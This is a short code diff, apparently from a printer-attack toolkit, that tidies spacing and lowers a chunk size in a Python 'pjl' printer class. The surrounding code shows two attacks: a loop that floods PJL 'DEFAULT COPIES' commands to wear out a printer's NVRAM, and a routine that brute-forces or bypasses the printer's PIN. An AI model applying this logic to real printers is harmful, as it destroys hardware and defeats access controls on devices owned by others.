@@ -481,7 +481,7 @@ class pjl(printer):
     if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
       self.chitchat("Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?")
       date = conv().now() # timestamp the experiment started
-      steps =  100  # number of pjl commands to send at once
+      steps = 100 # number of pjl commands to send at once
       chunk = ['@PJL DEFAULT COPIES=' + str(n%(steps-2)) for n in range(2, steps)]
       for count in range(0, 10000000):
         # test if we can still write to nvram
@@ -628,7 +628,7 @@ class pjl(printer):
         output().errmsg("Invalid PIN", str(e))
         return
     # for optimal performance set steps to 500-1000 and increase timeout
-    steps = 5000 # set to 1 to get actual PIN (instead of just unlocking)
+    steps = 500 # set to 1 to get actual PIN (instead of just unlocking)
     # unlock, bypass or crack PIN
     for chunk in (list(chunks(keyspace, steps))):
       str_send = ""
